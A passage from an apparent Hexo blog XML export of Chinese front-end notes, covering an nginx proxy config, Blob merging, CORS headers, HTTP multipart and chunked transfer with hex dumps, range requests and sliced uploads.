#location ~ \.php$ &#123;</span><br><span class="line">        #    proxy_pass   http://127.0.0.1;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    root           html;</span><br><span class="line">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        #    fastcgi_index  index.php;</span><br><span class="line">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">        #    include        fastcgi_params;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class="line">        # concurs with nginx&apos;s one</span><br><span class="line">        #</span><br><span class="line">        #location ~ /\.ht &#123;</span><br><span class="line">        #    deny  all;</span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       8080;</span><br><span class="line">		server_name  localhost:8080;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   F:/html/myHtmlTest;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">		location /api &#123;</span><br><span class="line">             proxy_pass http://192.168.1.33:8000/api;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       8000;</span><br><span class="line">    #    listen       somename:8080;</span><br><span class="line">    #    server_name  somename  alias  another.alias;</span><br><span class="line"></span><br><span class="line">    #    location / &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # HTTPS server</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       443 ssl;</span><br><span class="line">    #    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #    ssl_certificate      cert.pem;</span><br><span class="line">    #    ssl_certificate_key  cert.key;</span><br><span class="line"></span><br><span class="line">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class="line">    #    ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">    #    ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">    #    location / &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>微信支付宝官方设计资源下载</title>
    <url>/%E5%89%8D%E7%AB%AF/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%E5%AE%9D%E5%AE%98%E6%96%B9%E8%AE%BE%E8%AE%A1%E8%B5%84%E6%BA%90%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<p><a href="https://wechat.design/standard/download/brand#%E6%A0%87%E5%BF%97%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90" target="_blank" rel="noopener">【微信官方设计资源】</a></p>
<p><a href="https://opendocs.alipay.com/open/204/0191v1" target="_blank" rel="noopener">【App 支付界面规范】</a><br><a href="https://gw.alipayobjects.com/os/bmw-prod/31d3311f-1703-44b0-abdf-aedcc43946d3.zip" target="_blank" rel="noopener">【支付宝收银台视觉规范和素材】</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>js操作Blob合并</title>
    <url>/%E5%89%8D%E7%AB%AF/js%E6%93%8D%E4%BD%9CBlob%E5%90%88%E5%B9%B6/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>用 <code>axios</code> 请求二进制文件，一般会得到 <code>Blob</code> 或者 <code>ArrayBuffer</code>。</p>
<blockquote>
<p>需要将 <code>axios</code> 的请求设置为 <code>responseType: &#39;blob&#39;或者&#39;arraybuffer&#39;请求二进制文件，一般会得到Blob或者arraybuffer。&#39;</code> </p>
</blockquote>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><blockquote>
<p><a href="http://javascript.ruanyifeng.com/htmlapi/file.html" target="_blank" rel="noopener"><code>Blob</code> 对象是一个代表二进制数据的基本对象，生成Blob对象有两种方法：一种是使用Blob构造函数，另一种是对现有的Blob对象使用slice方法切出一部分。</a></p>
</blockquote>
<blockquote>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener"><code>ArrayBuffer</code> 对象用来表示通用的、固定长度的原始二进制数据缓冲区。ArrayBuffer 不能直接操作，而是要通过类型数组对象或 DataView 对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容。</a></p>
</blockquote>
<h2 id="切片和合并"><a href="#切片和合并" class="headerlink" title="切片和合并"></a>切片和合并</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//假设blob变量是一张png图片的二进制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//切片为三个blob</span></span><br><span class="line"><span class="keyword">let</span> blob1 = blob.slice(<span class="number">0</span>, n);</span><br><span class="line"><span class="keyword">let</span> blob2 = blob.slice(n,m);</span><br><span class="line"><span class="keyword">let</span> blob3 = blob.slice(m,length);</span><br><span class="line"></span><br><span class="line"><span class="comment">//合并</span></span><br><span class="line"><span class="keyword">let</span> merge = <span class="keyword">new</span> Blob([blob1,blob2,blob3],&#123;<span class="attr">type</span>:<span class="string">"image/png"</span>&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://javascript.ruanyifeng.com/#introduction" target="_blank" rel="noopener">《JavaScript 标准参考教程》</a></li>
<li><a href="https://www.w3cschool.cn/nwfchn/by6lmozt.html" target="_blank" rel="noopener">《JavaScript 标准参考教程》备份地址，整体阅读效果更好</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Blob" target="_blank" rel="noopener"> Web API 接口参考 Blob </a></li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>blob,js,vue</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS App GUI设计尺寸</title>
    <url>/%E5%89%8D%E7%AB%AF/%E6%89%8B%E6%9C%BA%E8%AE%BE%E8%AE%A1%E5%B0%BA%E5%AF%B8/</url>
    <content><![CDATA[<h2 id="苹果人机界面指南"><a href="#苹果人机界面指南" class="headerlink" title="苹果人机界面指南"></a>苹果人机界面指南</h2><p><a href="https://developer.apple.com/design/human-interface-guidelines/ios/visual-design/adaptivity-and-layout/" target="_blank" rel="noopener">【链接】</a></p>
<p><img src="/images/前端/iOS设计尺寸.png" alt="apple"></p>
<h2 id="axure默认的尺寸"><a href="#axure默认的尺寸" class="headerlink" title="axure默认的尺寸"></a>axure默认的尺寸</h2><p><img src="/images/前端/XD_手机设计尺寸.png" alt="axure"></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>iPhone</tag>
      </tags>
  </entry>
  <entry>
    <title>服务端解决前端ajax跨域</title>
    <url>/%E5%89%8D%E7%AB%AF/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%A7%A3%E5%86%B3%E5%89%8D%E7%AB%AFajax%E8%B7%A8%E5%9F%9F/</url>
    <content><![CDATA[<p>在响应头加入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Headers →x-requested-with,content-type</span><br><span class="line">Access-Control-Allow-Methods →POST</span><br><span class="line">Access-Control-Allow-Origin →*</span><br></pre></td></tr></table></figure></p>
<p>表示允许任何域名跨域访问，客户端访问示例 ：<a href="https://github.com/ximan/dropload/tree/gh-pages/examples" target="_blank" rel="noopener">传送门</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>深入解析HTTP--Multipart</title>
    <url>/%E5%89%8D%E7%AB%AF/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90HTTP--Multipart/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p><code>multipart/form-data</code> 用以向服务器发送二进制数据，一般用于多个文件和参数一起发送。</p>
<h2 id="服务端接收数据"><a href="#服务端接收数据" class="headerlink" title="服务端接收数据"></a>服务端接收数据</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/test/multipart"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">handleFileUpload</span><span class="params">(@RequestPart(<span class="string">"file"</span>)</span>MultipartFile file,</span></span><br><span class="line"><span class="function">							 @<span class="title">RequestPart</span><span class="params">(<span class="string">"describe"</span>)</span>String describe)</span>&#123;</span><br><span class="line"></span><br><span class="line">	System.out.println(<span class="string">"describe="</span>+describe);</span><br><span class="line">	<span class="keyword">if</span>(!file.isEmpty())&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			BufferedOutputStream out = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(file.getOriginalFilename())));</span><br><span class="line">			out.write(file.getBytes());</span><br><span class="line">			out.flush();</span><br><span class="line">			out.close();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">			<span class="keyword">return</span> e.getMessage();</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">			<span class="keyword">return</span> e.getMessage();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span><span class="string">"OK"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span><span class="string">"file is null"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ol>
<li>每一个文件或者参数做为一个Part</li>
<li>Part 都包含头信息部分</li>
<li>Part 头信息中必须包含一个 <code>Content-Disposition</code> 头，其他的头信息则为可选项， 比如 <code>Content-Type</code> 等</li>
<li>每个 Part 使用 <code>--boundary</code> 分割，最后一行使用 <code>--boundary--</code> 结尾</li>
</ol>
<p>举例：</p>
<p>发送一个请求，为了方便，这里上传一个txt文件 hello.txt 和一个参数 describe，二进制文件比如图片，直接发它的byte就可以了。</p>
<p>postman发送如图：<br><img src="/images/前端/postman_multipart.png" alt="postman_multipart.png"></p>
<p>postman请求发送的数据（每一行结尾都有一个 <code>CRLF</code>，空行也是有 <code>CRLF</code>）：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test/multipart</span> HTTP/1.1</span><br><span class="line"><span class="attribute">cache-control</span>: no-cache</span><br><span class="line"><span class="attribute">Postman-Token</span>: 8adf3cf7-6779-4273-ba5a-8b8a42103a02</span><br><span class="line"><span class="attribute">User-Agent</span>: PostmanRuntime/7.4.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:7878</span><br><span class="line"><span class="attribute">accept-encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">content-type</span>: multipart/form-data; boundary=--------------------------443008154012991210048296</span><br><span class="line"><span class="attribute">content-length</span>: 331</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">----------------------------443008154012991210048296</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="hello.txt"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line"><span class="attribute">12345</span></span><br><span class="line"><span class="attribute">----------------------------443008154012991210048296</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="describe"</span><br><span class="line"></span><br><span class="line">this is text</span><br><span class="line">----------------------------443008154012991210048296--</span><br><span class="line">HTTP/1.1 <span class="number">200</span> </span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 2</span><br><span class="line"><span class="attribute">Date</span>: Sat, 22 Dec 2018 09:38:14 GMT</span><br><span class="line"></span><br><span class="line"><span class="attribute">OK</span></span><br></pre></td></tr></table></figure>
<p>原始数据：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">504f5354202f746573742f6d756c74697061727420485454502f312e310d0a63616368652d636f6e74726f6c3a206e6f2d63616368650d0a506f73746d616e2d546f6b656e3a2038616466336366372d363737392d343237332d626135612d3862386134323130336130320d0a557365722d4167656e743a20506f73746d616e52756e74696d652f372e342e300d0a4163636570743a202a2f2a0d0a486f73743a203132302e37392e34332e34343a373837380d0a6163636570742d656e636f64696e673a20677a69702c206465666c6174650d0a636f6e74656e742d747970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3434333030383135343031323939313231303034383239360d0a636f6e74656e742d6c656e6774683a203333310d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3434333030383135343031323939313231303034383239360d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d2268656c6c6f2e747874220d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a</span><br><span class="line">31323334350d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3434333030383135343031323939313231303034383239360d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d226465736372696265220d0a0d0a7468697320697320746578740d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3434333030383135343031323939313231303034383239362d2d0d0a</span><br><span class="line">485454502f312e3120323030200d0a436f6e74656e742d547970653a20746578742f706c61696e3b636861727365743d5554462d380d0a436f6e74656e742d4c656e6774683a20320d0a446174653a205361742c2032322044656320323031382030393a33383a313420474d540d0a0d0a4f4b</span><br></pre></td></tr></table></figure></p>
<p>值得注意的一个地方就是 <code>boundary</code> ，postman和大多数浏览器都是用 <code>---------</code> 开头作为<code>boundary</code> 的值，而我们参照它来拼包时，很容易忘记分隔符是 <code>--</code> +  <code>boundary</code> 。</p>
<p>比如上面 postman 定义了 <code>boundary</code> 的值为</p>
<p> <code>--------------------------443008154012991210048296</code> （26个 <code>-</code> ），</p>
<p>而分割符的值是</p>
<p><code>----------------------------443008154012991210048296</code> （28个 <code>-</code> ）。</p>
<p>但其实只有保证整个包内出现和 <code>boundary</code> 相同的内容即可，我们重新定义一个没有 <code>-</code> 的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">content-type: multipart/form-data; boundary=fe1f62da7dbc44bea38db39dbf07413b</span><br><span class="line"></span><br><span class="line">--fe1f62da7dbc44bea38db39dbf07413b</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;hello.txt&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这样就可以了。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>深入解析HTTP--Chunk分块发送</title>
    <url>/%E5%89%8D%E7%AB%AF/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90HTTP--Chunk%E5%88%86%E5%9D%97%E5%8F%91%E9%80%81/</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由网页服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。</p>
<p>客户端给服务器发送数据也一样可以使用 Chunk 传输，比如，客户端要上传数据，但是数据没有完全生成，通过chunk分块传输，就可以一边生成数据一边上传，典型的比如：上传录音。</p>
<h2 id="服务端接收数据"><a href="#服务端接收数据" class="headerlink" title="服务端接收数据"></a>服务端接收数据</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/upload"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">upload</span><span class="params">(@RequestBody <span class="keyword">byte</span>[] body)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="string">"PONG:"</span>+body.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>postman一次发送body，如下图：</p>
<p><img src="/images/前端/postman_post_body.png" alt="postman_post_body.png"></p>
<h2 id="客户端分块发送"><a href="#客户端分块发送" class="headerlink" title="客户端分块发送"></a>客户端分块发送</h2><ol>
<li>chunk 需要加入头：<code>Transfer-Encoding: chunked</code></li>
<li>每个 chunk 块的格式都是：<code>[chunk size][CRLF][chunk data][CRLF]</code></li>
<li>结束 chunk 块是0，也就是：<code>[0][CRLF][CRLF]</code></li>
</ol>
<p>举例：</p>
<p>发送一个请求，body 内容为 <code>12HELLO</code>，其中 <code>12</code> 是一个 chunk 包，<code>HELLO</code>是一个 chunk 包。</p>
<p>分块请求体：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /test/upload HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: 192.168.0.223:7878\r\n</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive\r\n</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">2\r\n</span></span><br><span class="line"><span class="attribute">12\r\n</span></span><br><span class="line"><span class="attribute">5\r\n</span></span><br><span class="line"><span class="attribute">HELLO\r\n</span></span><br><span class="line"><span class="attribute">0\r\n\r\n</span></span><br></pre></td></tr></table></figure>
<p>原始数据：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">504f5354202f746573742f75706c6f616420485454502f312e310d0a</span><br><span class="line">486f73743a203139322e3136382e302e3232333a373837380d0a</span><br><span class="line">436f6e6e656374696f6e3a206b6565702d616c6976650d0a</span><br><span class="line">436f6e74656e742d547970653a20746578742f706c61696e0d0a</span><br><span class="line">5472616e736665722d456e636f64696e673a206368756e6b65640d0a</span><br><span class="line">0d0a</span><br><span class="line">32</span><br><span class="line">0d0a</span><br><span class="line">3132</span><br><span class="line">0d0a</span><br><span class="line">350d0a48454c4c4f0d0a</span><br><span class="line">300d0a0d0a</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>火狐插件-查看网站的架构</title>
    <url>/%E5%89%8D%E7%AB%AF/%E7%81%AB%E7%8B%90%E6%8F%92%E4%BB%B6-%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%AB%99%E7%9A%84%E6%9E%B6%E6%9E%84/</url>
    <content><![CDATA[<p>wappalyzer,可以大概知道一个网站的服务器软件，使用的js库等信息。<br>原理的话，应该是网站响应的header信息。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>深入解析HTTP--断点续传</title>
    <url>/%E5%89%8D%E7%AB%AF/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90HTTP--%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0/</url>
    <content><![CDATA[<p>断点下载HTTP协议中有支持，一般的Web服务器都会支持，如 <code>nginx</code>。</p>
<blockquote>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests" target="_blank" rel="noopener">HTTP 协议范围请求允许服务器只发送 HTTP 消息的一部分到客户端。范围请求在传送大的媒体文件，或者与文件下载的断点续传功能搭配使用时非常有用。</a></p>
</blockquote>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul>
<li>断点下载，下载大文件可以暂停。</li>
<li>多任务/多线程下载大文件（类似迅雷软件）</li>
</ul>
<h2 id="一、检查服务器是否支持断点续传"><a href="#一、检查服务器是否支持断点续传" class="headerlink" title="一、检查服务器是否支持断点续传"></a>一、检查服务器是否支持断点续传</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># curl -I http://192.168.0.30/test.txt</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 16 Aug 2019 02:00:07 GMT</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 6000</span><br><span class="line">Last-Modified: Tue, 13 Aug 2019 09:45:45 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: <span class="string">"5d5286c9-1770"</span></span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: *</span><br><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure>
<ul>
<li>响应中 <code>Accept-Ranges: bytes</code> 字段表示支持断点续传，并且单位是 <code>bytes</code>。</li>
<li>响应中 <code>Content-Length: 6000</code> 是文件的完整大小。</li>
</ul>
<p>如果服务器响应未发送 <code>Accept-Ranges</code> ，那么它们有可能不支持断点续传。一些服务器会明确将其值设置为 “none”，以此来表明不支持。在这种情况下，某些应用的下载管理器会将暂停按钮禁用。</p>
<h2 id="二、请求特定的范围"><a href="#二、请求特定的范围" class="headerlink" title="二、请求特定的范围"></a>二、请求特定的范围</h2><p>假如服务器支持 <code>Range</code> 请求的话，你可以在 <code>Header</code> 中 使用 <code>Range</code> 指示服务器应该返回文件的某部分。</p>
<h3 id="单一范围"><a href="#单一范围" class="headerlink" title="单一范围"></a>单一范围</h3><p>只需在 <code>Headers</code> 中加入 <code>Range</code> 字段，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Range: &quot;bytes=0-99&quot;</span><br></pre></td></tr></table></figure>
<p>表示请求文件的前100个字节，服务器端会返回状态码为 <code>HTTP/1.1 206 Partial Content</code> 的响应</p>
<p>curl请求如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># curl http://192.168.0.30/test.txt -i -H "Range: bytes=0-99"</span></span><br><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 16 Aug 2019 02:10:05 GMT</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 100</span><br><span class="line">Last-Modified: Tue, 13 Aug 2019 09:45:45 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: <span class="string">"5d5286c9-1770"</span></span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: *</span><br><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br><span class="line">Content-Range: bytes 0-99/6000</span><br><span class="line"></span><br><span class="line">1ababadalgharaghtakamminarronnkonnbronntonnerronntbababadalgharaghtakamminarronnkonnbronntonnerronnt</span><br></pre></td></tr></table></figure>
<h3 id="多重范围"><a href="#多重范围" class="headerlink" title="多重范围"></a>多重范围</h3><p>Range头部也支持一次请求文档的多个部分。请求范围用一个逗号分隔开。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># curl http://192.168.0.30/test.txt -i -H "Range: bytes=0-50, 100-150"</span></span><br><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 16 Aug 2019 02:12:14 GMT</span><br><span class="line">Content-Type: multipart/byteranges; boundary=00000000029</span><br><span class="line">Content-Length: 278</span><br><span class="line">Last-Modified: Tue, 13 Aug 2019 09:45:45 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: <span class="string">"5d5286c9-1770"</span></span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: *</span><br><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--00000000029</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Range: bytes 0-50/6000</span><br><span class="line"></span><br><span class="line">1ababadalgharaghtakamminarronnkonnbronntonnerronntb</span><br><span class="line">--00000000029</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Range: bytes 100-150/6000</span><br><span class="line"></span><br><span class="line">2ababadalgharaghtakamminarronnkonnbronntonnerronntb</span><br><span class="line">--00000000029--</span><br></pre></td></tr></table></figure>
<p><code>Content-Type：multipart/byteranges</code> 表示这个响应有多个 <code>byterange</code> 。每一部分 <code>byterange</code> 都有他自己的 <code>Content-Type</code> 头部和 <code>Content-Range</code> ，并且使用 <code>boundary</code> 参数对body进行划分。</p>
<h3 id="条件式范围请求"><a href="#条件式范围请求" class="headerlink" title="条件式范围请求"></a>条件式范围请求</h3><p>当（中断之后）重新开始请求更多资源片段的时候，必须确保自从上一个片段被接收之后该资源没有进行过修改。</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Range" target="_blank" rel="noopener"><code>The If-Range</code></a> 请求首部可以用来生成条件式范围请求：<br>假如条件满足的话，条件请求就会生效，服务器会返回状态码为 <code>206 Partial</code> 的响应，以及相应的消息主体。<br>假如条件未能得到满足，那么就会返回状态码为 <code>200 OK</code> 的响应，同时返回整个资源。</p>
<p>该Header字段值中既可以用 <code>Last-Modified</code> 时间值用作验证，也可以用 <code>ETag</code> 标记作为验证，但不能将两者同时使用。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># curl http://192.168.0.30/test.txt -i -H "Range: bytes=100-120" -H "If-Range: Tue, 13 Aug 2019 09:45:45 GMT"</span></span><br><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 16 Aug 2019 02:27:22 GMT</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 21</span><br><span class="line">Last-Modified: Tue, 13 Aug 2019 09:45:45 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: <span class="string">"5d5286c9-1770"</span></span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: *</span><br><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br><span class="line">Content-Range: bytes 100-120/6000</span><br><span class="line"></span><br><span class="line">2ababadalgharaghtakam</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>深入解析HTTP--切片上传</title>
    <url>/%E5%89%8D%E7%AB%AF/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90HTTP--%E5%88%87%E7%89%87%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>切片上传一般用在大文件上传，防止上传过程中网络断开重头开始，但在HTTP协议里面并没有，所以实现要使用自定义一下方法。</p>
<p>网上很多资料，大概实现的原理：</p>
<ol>
<li>客户端将大文件切为X份，每份切片都做md5校验。</li>
<li>按顺序一次上传一片，同时前后端做md5校验。</li>
<li>切片上传过程中可以暂停，并且在发生网络异常时，只是某切片上传失败。</li>
<li>上传所有切片之后，请求合并文件，后端将所有切片合并，前后端再次对大文件进行md5校验。</li>
</ol>
<h2 id="js本地文件切片"><a href="#js本地文件切片" class="headerlink" title="js本地文件切片"></a>js本地文件切片</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> blob = file.slice(start, end,file.type);</span><br></pre></td></tr></table></figure>
<p><code>blob</code> 可以直接放入到 <code>FormData</code> 中。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>用腻了Bootstrap的可以试试Semantic-UI</title>
    <url>/%E5%89%8D%E7%AB%AF/%E7%94%A8%E8%85%BB%E4%BA%86Bootstrap%E7%9A%84%E5%8F%AF%E4%BB%A5%E8%AF%95%E8%AF%95Semantic-UI/</url>
    <content><![CDATA[<p><a href="https://semantic-ui.com/elements/placeholder.html" target="_blank" rel="noopener">semantic-ui</a><br>是html/css框架的新贵，是继bootstrap和foundation之后的又一css神器。semantic-ui一出现在github上就受到火热的关注，一直在关注排行榜前列。semantic-ui最大的特点：充分利用CSS3动画特效，简洁实用漂亮的样式这些都是其最受欢迎的原因之一。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>用cnpm安装软件库的一个问题</title>
    <url>/%E5%89%8D%E7%AB%AF/%E7%94%A8cnpm%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%E5%BA%93%E7%9A%84%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98/</url>
